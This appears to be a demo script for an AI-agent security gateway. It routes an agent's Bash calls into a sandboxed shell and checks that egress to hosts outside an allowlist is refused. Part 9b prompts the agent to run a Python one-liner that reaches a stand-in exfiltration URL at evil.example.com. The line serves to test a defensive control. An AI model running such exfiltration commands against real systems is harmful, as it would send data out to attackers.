"""Phase 9: Governed Shell — built-in Bash executed by the gateway, not by the framework.

With `builtin_exec_routing: governed_shell` on the agent's policy, an allowed
built-in Bash call is not executed by the SDK at all. The admission decision
evaluates it as `shell:execute`, issues a single-use execution ticket, and
answers with `updated_input` rewriting the command to `mitrity-hook exec
<ticket>`. The SDK runs that relay; the relay redeems the ticket and the
gateway executes the judged bytes inside its own sandbox (bubblewrap on
Linux), with egress confined to a local proxy that enforces the agent's
destination allowlist, and returns the redacted output.

What this phase shows:

  9a A routed command: the SDK's Bash result is the governed shell's output;
     the audit event carries execution_result.sandbox_mode (bubblewrap,
     seatbelt, none, ...) and the hash of what ran.
  9b Egress to a host outside the destination allowlist: the command runs,
     the connection is refused by the governed shell's proxy, and the denial
     is counted on the execution event.

REQUIRES sentinel >= v0.21.0 (the release that ships the `exec` tool source,
`POST /v1/exec` and the `mitrity-hook exec` relay), `exec.enabled: true` in
gateway.yaml, the `mitrity-hook` binary on PATH inside the container, and the
policy knob `builtin_exec_routing: governed_shell`. The demo image pulls the
gateway from `ghcr.io/mitrity-io/mitrity-mcp-gateway:latest`; until that tag
carries the governed shell, this phase prints what it will demonstrate and
skips. Set MITRITY_DEMO_FORCE_PHASE9=1 to run it anyway.

Contract: the Admission API documentation ("Routed Bash",
https://mitrity.com/docs/integrations/admission-api) and the governed shell page
(https://mitrity.com/docs/edge/governed-shell).
"""

from output import info, pause
from runner_support import governed_shell_available


async def run(agent) -> None:
    if not governed_shell_available():
        info(
            "Phase 9 requires sentinel >= v0.21.0 (governed shell routing). The gateway in this "
            "image admits built-in Bash through the hook but does not route it into the governed "
            "shell yet, so this phase is skipped. What it demonstrates:"
        )
        info("  9a a built-in Bash call routed into the gateway's sandboxed shell (judged bytes execute)")
        info("  9b egress to a non-allowlisted host refused by the governed shell's proxy")
        info("Set MITRITY_DEMO_FORCE_PHASE9=1 to run it against a newer gateway.")
        return

    info(
        "Built-in Bash is now executed by the gateway's governed shell: the hook rewrites the "
        "command to `mitrity-hook exec <ticket>`, and the gateway runs the judged bytes in its "
        "own sandbox with egress confined to the destination allowlist."
    )
    await pause(1.0)

    # ── 9a Routed execution ────────────────────────────────────────────
    info("9a: a routed command — expect the file contents, executed by the governed shell")
    await agent.run_prompt(
        "Using your own built-in Bash tool, run `cat /workspace/project/config.yaml` and "
        "tell me the value of the first key in the file."
    )
    await pause(1.0)

    # ── 9b Egress denied by the proxy ──────────────────────────────────
    info("9b: egress to a host outside the destination allowlist — expect a refused connection")
    await agent.run_prompt(
        "Using your own built-in Bash tool, run exactly this command and report what happens:\n"
        "python3 -c \"import urllib.request; print(urllib.request.urlopen("
        "'https://evil.example.com/exfiltrate', timeout=5).read())\"\n"
        "Report the error message if the connection fails; do not try another way."
    )
    await pause(1.0)

    info(
        "Phase 9 complete. The audit events for these calls carry action_type shell:execute, "
        "surface agent_hook, execution_result.sandbox_mode and the egress counters "
        "(connects_allowed / connects_denied / denied_hosts)."
    )
